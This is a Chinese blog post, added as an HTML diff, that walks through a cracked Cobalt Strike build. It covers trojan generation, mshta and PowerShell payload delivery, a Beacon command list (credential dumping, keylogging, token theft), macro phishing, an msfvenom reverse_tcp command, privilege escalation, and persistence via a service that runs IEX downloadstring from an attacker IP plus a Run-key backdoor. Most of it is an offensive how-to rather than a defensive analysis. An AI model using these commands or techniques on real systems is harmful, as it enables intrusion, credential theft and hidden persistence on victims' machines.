@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>cobalt_strike基本使用 | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">cobalt_strike基本使用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 27, 2020&nbsp;&nbsp;15:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>百度的汉化破解版，<a href="https://www.nctry.com/1744.html" target="_blank" rel="noopener">源地址</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927082243.png" alt=""></p>
+<p>下载下来可以看到有挺多文件，但我们只需要关注两个文件即可，start和teamserver</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927082403.png" alt=""></p>
+<p>简单介绍下，Cobalt Strike是一款基于java的渗透测试工具，也就是经常在大佬文章中出现的称为CS的神器。它分为客户端和服务端，服务端的关键文件是teamserver和cobaltstrike.jar，而客户端只需在主机上执行start，然后连接服务端即可，通过这种模式，多个客户端可以连接到一个服务端，使得团队成员之间可以共享攻击资源与目标信息和sessions，提升效率。</p>
+<p>这里演示下连接效果，以linux服务端为例（当然windows也可以，上面我们可以看到作者已经给我们创建好了bat文件）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927085932.png" alt=""></p>
+<p>查看本机ip地址，执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver ip password #password自定义</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090150.png" alt=""></p>
+<p>客户端运行start.bat，填写相应连接信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090514.png" alt=""></p>
+<p>点击连接，成功上线</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090609.png" alt=""></p>
+<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>已经是中文版，就方便很多了，这里实践一下百度的一些常用方法</p>
+<p>参考:<a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">1</a>，<a href="https://www.freebuf.com/vuls/224507.html" target="_blank" rel="noopener">2</a>，<a href="https://blog.csdn.net/weixin_44677409/article/details/102725418" target="_blank" rel="noopener">3</a></p>
+<h4 id="上线肉鸡"><a href="#上线肉鸡" class="headerlink" title="上线肉鸡"></a>上线肉鸡</h4><h5 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h5><p>Cobalt Strike–&gt;监听器–&gt;add–&gt;save</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927092754.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927092928.png" alt=""></p>
+<h5 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h5><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927093743.png" alt=""></p>
+<p>方式选择powershell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094219.png" alt=""></p>
+<p>Generate生成</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094313.png" alt=""></p>
+<h5 id="生成web链接"><a href="#生成web链接" class="headerlink" title="生成web链接"></a>生成web链接</h5><p>用刚刚生成的文件生成下载链接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094522.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094754.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094817.png" alt=""></p>
+<h5 id="运行木马"><a href="#运行木马" class="headerlink" title="运行木马"></a>运行木马</h5><p>在目标主机上运行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095101.png" alt=""></p>
+<p>回车，返回Cobalt Strike即可看见肉鸡成功上线</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095156.png" alt=""></p>
+<p>点击进入beacon使用shell+命令即可执行交互</p>
+<p>这里借用一下<a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">大佬</a>的命令表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     进程参数欺骗</span><br><span class="line">    blockdlls                 在子进程中阻止非Microsoft的DLLs文件</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    cd                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   通过TCP连接到Beacon</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    cp                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程VNC</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   尝试提权</span><br><span class="line">    execute                   在目标上执行程序(无输出)</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    exit                      退出beacon</span><br><span class="line">    getprivs                  对当前令牌启用系统权限</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    help                      帮助</span><br><span class="line">    inject                    在特定进程中生成会话</span><br><span class="line">    jobkill                   杀死一个后台任务</span><br><span class="line">    jobs                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    kill                      结束进程</span><br><span class="line">    link                      通过命名管道连接到Beacon</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    ls                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    mkdir                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    mv                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      给当前目标机器备注       </span><br><span class="line">    portscan                  进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      为生成的post-ex任务设置父PID</span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    使用服务在主机上生成会话</span><br><span class="line">    psexec_psh                使用PowerShell在主机上生成会话</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    pwd                       当前目录位置</span><br><span class="line">    reg                       查询注册表</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    rm                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以另一个用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      在另一个PID下执行程序</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     cmd执行命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   生成进程并将shellcode注入其中</span><br><span class="line">    sleep                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     生成一个会话 </span><br><span class="line">    spawnas                   以其他用户身份生成会话</span><br><span class="line">    spawnto                   将可执行程序注入进程</span><br><span class="line">    spawnu                    在另一个PID下生成会话</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class="line">    unlink                    断开与Beacon的连接</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM在主机上生成会话</span><br><span class="line">    wmi                       使用WMI在主机上生成会话</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095923.png" alt=""></p>
+<h4 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h4><p>开启sock代理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101318.png" alt=""></p>
+<p>主机配置proxychains.conf</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101306.png" alt=""></p>
+<p>nmap扫描内网存活主机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101725.png" alt=""></p>
+<h4 id="Metasploit联动"><a href="#Metasploit联动" class="headerlink" title="Metasploit联动"></a>Metasploit联动</h4><h5 id="CS木马msf监听"><a href="#CS木马msf监听" class="headerlink" title="CS木马msf监听"></a>CS木马msf监听</h5><p>msf开启监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927105130.png" alt=""></p>
+<p>Cobalt Strike上创建两个监听器，windows/beacon_http/reverse_http来监听肉鸡，windows/foreign/reverse_http来将获取到的控制权传给msf(端口与msf监听的端口一致)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927105650.png" alt=""></p>
+<p>选择foreign监听器生成木马在主机上执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927110336.png" alt=""></p>
+<p>主机上执行可以看到成功获取会话</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927110621.png" alt=""></p>
+<p>但就像博主说的，会话极其不稳定，马上就断开了</p>
+<h5 id="msf生成木马CS监听"><a href="#msf生成木马CS监听" class="headerlink" title="msf生成木马CS监听"></a>msf生成木马CS监听</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.126.128 lport&#x3D;6666 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>
+
+<p>cs生成链接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111407.png" alt=""></p>
+<p>目标主机访问链接运行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111710.png" alt=""></p>
+<p>返回msf可以看到已经获取会话</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111800.png" alt=""></p>
+<h4 id="宏钓鱼"><a href="#宏钓鱼" class="headerlink" title="宏钓鱼"></a>宏钓鱼</h4><p>选择office方式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144456.png" alt=""></p>
+<p>点击生成之后弹出提示框告诉我们步骤</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144601.png" alt=""></p>
+<p>首先随便打开一个word或者office，查看macros</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144814.png" alt=""></p>
+<p>随意命名，打开到this document，回到cs复制macro，粘贴</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145103.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145149.png" alt=""></p>
+<p>关闭另存为启用宏的word文档</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145247.png" alt=""></p>
+<p>目标主机打开这个带有恶意宏的文档即可上线</p>
+<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>CS支持生成多种语言的shellcode</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145749.png" alt=""></p>
+<p>比如powershell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145926.png" alt=""></p>
+<p>将payload.ps1复制到目标系统并执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &#39;C:\payload.ps1&#39;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150144.png" alt=""></p>
+<p>返回CS即可看到返回会话</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150217.png" alt=""></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>CS内置两个exp</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150616.png" alt=""></p>
+<p>通过<a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">项目</a>可以导入脚本文件来扩展漏洞库，点击Cobalt Strike中的脚本管理器，点击load加载下来的cna文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150958.png" alt=""></p>
+<p>选择相应的exp即可尝试提权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151052.png" alt=""></p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>目的是即使目标主机重启，依旧能保持目标的控制权</p>
+<h5 id="设置服务后门"><a href="#设置服务后门" class="headerlink" title="设置服务后门"></a>设置服务后门</h5><p>生成一个服务器的恶意脚本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151551.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151649.png" alt=""></p>
+<p>复制生成的命令在目标主机上执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151825.png" alt=""></p>
+<p>返回同样上线主机，但只有普通用户的权限，因此想要完成以下的操作需要提权，我这里因为是虚拟机，直接管理员运行了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927152932.png" alt=""></p>
+<p>打开beacon shell并执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;blacknight&quot; binpath&#x3D; &quot;cmd &#x2F;c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.183.148:80&#x2F;a&#39;))\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153143.png" alt=""></p>
+<p>执行成功，这时查看目标主机的服务信息发现一个名为blacknight的服务已经创建了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153253.png" alt=""></p>
+<p>但还是手动的，因此我们需要把他设为自动</p>
+<p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc config &quot;name&quot; start&#x3D; auto</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153402.png" alt=""></p>
+<p>这是再返回主机查看可以看到已经变成自动的了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153453.png" alt=""></p>
+<p>这样就设置好了一个服务后门。</p>
+<h5 id="设置注册表后门"><a href="#设置注册表后门" class="headerlink" title="设置注册表后门"></a>设置注册表后门</h5><p>首先在CS上生成一个恶意可执行文件上传到服务器上</p>
+<p>右键打开文件管理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153949.png" alt=""></p>
+<p>点击下方的upload将恶意文件上传到主机上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154045.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154026.png" alt=""></p>
+<p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add HKLM_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &quot;keyname&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\Users\15363\Desktop\artifact.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154224.png" alt=""></p>
+<p>打开主机注册表编辑器可以看到已经写入成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927155036.png" alt=""></p>
+<p>就跟着做到这里吧，总算是熟悉了一下会用了，以后有啥高级用法另开。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/09/27/cs_learn_note/">http://www.blacknight.top/2020/09/27/cs_learn_note/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/cobaltstrike/"># cobaltstrike</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/09/20/ichunqiu_sum/">i春秋刷题——综合渗透测试实验</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
